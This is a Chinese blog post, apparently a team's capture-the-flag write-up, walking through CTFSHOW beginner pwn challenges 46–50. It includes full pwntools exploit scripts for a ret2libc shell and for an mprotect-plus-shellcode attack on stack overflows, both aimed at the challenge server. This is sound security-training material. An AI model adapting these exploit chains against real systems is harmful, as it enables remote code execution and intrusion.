---
title: CTFSHOW-PWN（46-50）
url: https://mp.weixin.qq.com/s/HPA4ae_5ZlLV7VKsLIL28Q
source: Doonsec's feed
date: 2026-03-02
fetch_date: 2026-03-03T04:06:50.116606
---

# CTFSHOW-PWN（46-50）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/fE13Qb8uKhhVPphpwibxPKv1cjXvHjwdhdPChYulyibJlNGbDwhpmyjOhIOiaVzDHicprnd4Fb0AHXdpBypwIgMnSOvUMkDibLfL47LEfnRwy3Xs/0?wx_fmt=jpeg)

# CTFSHOW-PWN（46-50）

Megrez。
Megrez。

B1acktide安全团队

![]()

在小说阅读器中沉浸阅读

# PWN入门46

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhjibk4yPfUlTjlVC2Csk4LAy7TDBMcT0pAY44clcssgRfBQcfTz0BRBrmQWcbicpPTSMthOVNhFbZMnxXqaF6XOPfuYq993l8STc/640?wx_fmt=png&from=appmsg)

检查

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhgBC0TIMTODzY5eLHbIYgC0oGvk9zoD852cPK4WKJaKzxGJEfwC9ib9raNQFNW7NUSVsvgqtN3Tg52NHTAv6wFFuJs3XC2W1o5c/640?wx_fmt=png&from=appmsg)

64位，其他的没区别，开IDA

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhiapNK5a3jtac1Gm4zvdImrkvW0laia7WaahqxPCRq4sMFbVwudyP1IjebOdQNPtXF4ibe1A9RiaLY5pYKypTANHpjZicUYQNenTyPE/640?wx_fmt=png&from=appmsg)

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhhJLr3A4cmsZDicuMs6n34c5AWeuPPn7tnDPh2GWGweOBDxhzFc5CJ0DWsNTNfPFicufRqcJY1iaw5jowCJuT3M8o76jGl0vY4wNI/640?wx_fmt=png&from=appmsg)

正常存在缓冲区溢出

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhh5y2TTJibaff2aI5HAY5Y8PRWV9J1rNuo7fgx6AHIiaeYiaibkfQZFRUibM2sic1mVCDicQS0ktDlE0aFUpnSe8jduSObVicb9OKIBckU/640?wx_fmt=png&from=appmsg)

我们发现了这个玩意，思路大体跟上一个一致，知识又要考虑堆栈平衡一类的东西:开！

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhjvcQjLJ3E08oNxAypbDm9ictxl1IZrXkJ4jllLfOCSLx24dtv1MTF6pD0e0mjxC4Kfh2z2JEiadjOr0nGo8aaxqXuUQa3KtZjbU/640?wx_fmt=png&from=appmsg)

好了，说白了直接套用上面的exp：

```
from pwn import *context.log_level='debug'p=remote("pwn.challenge.ctf.show",28162)elf=ELF("./pwn46")libc=ELF("./libc-2.27.so")puts_plt=elf.plt['puts']puts_got=elf.got['puts']main_addr=elf.symbols['main']offset=0x70+0x8rdi_addr=0x400803ret_addr=0x4004fepayload1=offset*b'a'+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)    #注意ret_addr的使用，跳过指令很可能使程序崩溃p.sendline(payload1)puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))print(hex(puts_addr))base_addr=puts_addr-libc.symbols['puts']print(hex(base_addr))sys_addr=base_addr+libc.symbols['system']binsh_addr=base_addr+next(libc.search(b'/bin/sh'))payload2=offset*b'a'+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(sys_addr)p.sendline(payload2)p.interactive()
```

执行即可得到flag

# PWN入门47

一样，检查文件

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhiabVb09TZy7icBORFbS0hppYK9iaRAuZSvKDhBzDsicfEkJ0MQib4Tj8uAajU42sWXwn29Dn0InjBDzouSnFxkyPefjW6n15WicZSPM/640?wx_fmt=png&from=appmsg)

32位，不用考虑堆栈平衡；PR，可以用动态链接库修改GOT；没开canary，可以直接溢出；开了NX，没法直接注入shellcode执行；没开PIE，位置确定

打开IDA

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhia8O6OqhxsibkOH4KDCy4vxx0ib2XZwfiaREib5qt6N04y375SoLEAia3bkdCvLTsAkXiauqQ0EsrQqWeRULFL9eSBY5fMbm2JUvsk7E/640?wx_fmt=png&from=appmsg)

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhiaTDicSgjsmsNKoxicMoewEmsP5FV5BLrZcLeghB9vicIzW1ibakKhEyhegCwib17yrS84iaNSxGI5ibMlEQ7s7yGdEia9hSBuKC2JjHicQ/640?wx_fmt=png&from=appmsg)

设定s长度152，而gets函数压根不检查输入长度，我们可以直接输入超过152的数据覆盖栈上的返回地址与其他关键数据，实现任意代码执行，而主函数也可以泄露puts等函数地址

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhgqD1mmb3eZ2HgqQibX3uZd0xUk7CVQKECl3eFm8dQQ5fU5ibZsCN6FU2Mn2dBswCgm4uMHRJQY7hic5SH0VKmzWpkHFozmGEFzeY/640?wx_fmt=png&from=appmsg)

我们又在文件里发现了/bin/sh，跟45一样搓脚本即可

# PWN入门49

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhhtmyvnAfcsW83R9dHvuqkZTuTiaYxbdJxynoBGAcLtDHylkkuVJbwBVuKsoQZUgS76QcFnJdd974CTleGX4GKbIa8fjzicOxbSY/640?wx_fmt=png&from=appmsg)

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhjg7pnJPfh1XARKbeibg9kWeRqSNC5dicWytYll2ibYZuFPgbNHBzhLmfGwNMzpgklGQ8x05hNiajVDybZicia8uNekR6Db24XG9pKW0/640?wx_fmt=png&from=appmsg)

检查发现，32位，不用考虑堆栈平衡，PR，能用动态链接库动GOT，开了金丝雀需要泄露，开了NX没法直接执行注入的shellcode，没开PIE，位置确定

开IDA

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhhWQ9PbQ6zNZHdbPPMaNZ0IMAibENy26e2oCEwicibUceE8jmZ9fcMyywMtMicc7BKMdqRDQSxqu1HiaD8o9EpYFibiaWKlnQ4icT8RZibo/640?wx_fmt=png&from=appmsg)

主函数啥都没

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhhY5x1pVuoPLzq4yaYIG42EGtmVbYib1Cvpcnn3E5AyMI9HozoJBeibE6BT4xpS0O371h16nYiakicG8ibqqnicOTaG1EIxmibqibAXib2A/640?wx_fmt=png&from=appmsg)

这里直接存在溢出与危险函数，同时我们检查文件类型

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhjibnVJCKbFyAEhOPm9IgIvLXRibQ7uA08LLiad4cbLpcPnxteScUNZsQjd3MULlCSfsYfkY9VdYD82mUm8AznGnzmra6PJAler34/640?wx_fmt=png&from=appmsg)

statically linked，即静态编译文件，与此同时，题目提醒我们用到mprotect

mprotect函数解释：任何静态链接文件都存在此函数，其可以修改调用进程内存页的保护属性，如果调用进程尝试以违反保护属性的方式访问该内存，内核将给予一个SIGSEGV信号给该进程。

mprotect(viod \*addr,size\_t len,int prot)

addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址.

size\_t：简而言之为页大小（一般为4KB==4096个字节）的整数倍。

len：被修改保护属性区域的长度，最好是页大小的整数倍，修改区域范围[addr,addr+len-1]

prot：可以取read(可读)、write(可写)、exec(可执行)、none（不可访问）几个值。返回值：0->成功；-1->失败（且errno被设置）

EACCE：无法设置内存段的保护属性，当通过mmap（2）映射一个文件为只读权限时，接着使用mprotect()标志为PROT\_WRITE这种情况就会发生。

EINVAL：addr不是有效指针，或者不是系统页大小的倍数

ENOMEM：内核内部的结构体无法分配

PROT：R：4；W：2；X：1，PROT为7即为可读可写可执行

通过ID分析，我们知道要先填充22个A造成溢出，接下来就是ctfshow()函数的返回地址，我们要把其设置为MP函数的地址，接下来要找其地址

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhgm0xAwRttibR6qqd5QYBiaRqfoTYHBtW7GbXd6v3XuXBtpmMKCLwejoUjqmwE4ByBAtywO5t3WIE8rg8Coym29fibQxMiaa54fAicM/640?wx_fmt=png&from=appmsg)

找到咧，接下来需要再填入一个MP函数的返回地址，我们需要将其返回地址设置为read函数的地址，这样才能将shellcode写进内存空间。

我们知道MP函数是由三个参数的，所以大致思路如下，找一个三个pop一个ret的gadget，因为我们要将三个函数pop了才能ret跳到read函数执行

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhiatOA6CdJkGwNSpLdqaLYe2Z3EYb4jw5lVJtrUe0XfGIQsWKe0Wv3xhVV0I6BkHI1KFtaxicrI0JxQzyolxp1mEwuXUbBYgRIZo/640?wx_fmt=png&from=appmsg)

找到了，接下来找read函数，在IDA里看到ctfshow里有，那我们直接找

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhh3PabkqrwiacHYgDbiaugqLgXBJDTNAWgYC1hyHyPynNwYKBx0wM2KaibOB2icazdZiaTyVEpH1Hh1GibsBfeFuT4UIjb1Qk8Lb0THI/640?wx_fmt=png&from=appmsg)

如此我们找到了，接下来还要确定MP函数的参数：

起始地址，我们要修改权限的内存空间的起始地址，就是用GOT表的起始地址来存放shellcode

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhia9QGqaTbxD92siaA76O4I7wtaKwzfpAKOC7kw1ibnN5COvcaEeZjAdkeQiaS4vGjewt0ISkvTG8cFBM9j15flEFk1aSmQicBYMCvY/640?wx_fmt=png&from=appmsg)

第二个是我们要修改的空间大小，这个随便编，够用就行

第三个是权限，直接7，开到最大

不仅如此，我们调用read函数便要考虑其参数，参数1随便写个0，参数2填返回地址即shellcode的地址，第三个直接提取shellcode的长度，之后再发shellcode即可

EXP：

```
from pwn import *p=remote("pwn.challenge.ctf.show","28251")payload=22*'a'+p32(0x0806cdd0)+p32(0x08056194)+p32(0x080da000)+p32(0x1000)+p32(0x7)shellcode=asm(shellcraft.sh(),arch='i386',os='linux')payload+=p32(0x806bee0)+p32(0x080da000)+p32(0x0)+p32(0x080da000)+p32(len(shellcode))p.sendline(payload)p.sendline(shellcode)p.interactive()
```

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhgUxZfI7licoNXnHQDib9F412AwS7O5jd0Wv6KvRRNDtz38vuDb2CE4nyTgrQMzZnyUia1xjzMJ28hXibpVhtsfZEpFN6225bQ0lMQ/640?wx_fmt=png&from=appmsg)

# PWN入门50

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhialvXfunoVZ3WibNXgMfyaS2l1vmic3PqiclcU16pFy0n85b7EBxhxZv0wJWpkGnRQ7ndTTjUel8pNicg3V9eoVf0MUSl3jHTB5wtI/640?wx_fmt=png&from=appmsg)

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhhmxngzv7BsOz0EibnzsMfweyeNMYAw2GZaRQ9OfFn7Dgauw1eg2QV2y74wvBD19IFp1AFa2CWrlicyLFC84Rjk2niaDauxb2jWdU/640?wx_fmt=png&from=appmsg)

64位，考虑堆栈平衡；PR，可动GOT；没有金丝雀，开了NX，没开PIE，位置确定

开IDA

![0](https://mmbiz.qpic.cn/sz_mmbiz_png/fE13Qb8uKhjS1G5QlQzrLmXIdQNDtEDwgH5BydCWsWfwNicO0AxaZ8Vygh7pzp4wQlicozSzRnicibFS7pXXMcI4LtbUrL6YgoDgAk1bRN6SfibY/640?wx_fmt=png&from=appmsg)

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhgz3xdSjUqFt1zMylG2kSERnGVuJ6u3oF6Iic36p5vAIxLgTb7bV8ltOZxibmO4UgGaibXQHf45Xsw2vk8j5pKuVN5tXbpurK5NRA/640?wx_fmt=png&from=appmsg)

存在溢出漏洞，与此同时我们发现了这个函数

![0](https://mmbiz.qpic.cn/mmbiz_png/fE13Qb8uKhgUN9jh8XgKgico1he8kH0OXYgDfzFnQwPC9RrtNBqjXXicSp6rSldtEyj7GpKBDlLDNK4JEMsXV3pSx9VtPaXLiaNXiaOg0GcHaUA/640?wx_fmt=png&from=appmsg)

按照PWN46的老套路来就行

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/6r4mCjmylTX8e36HibroUYWpIx20UNGSyWl5GOCJKl7bc2TBwvvaykKHK6jHrXLibd2xGicfNDt47FibeXbUBicmJZQ/0?wx_fmt=png)

B1acktide安全团队

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/6r4mCjmylTX8e36HibroUYWpIx20UNGSyWl5GOCJKl7bc2TBwvvaykKHK6jHrXLibd2xGicfNDt47FibeXbUBicmJZQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过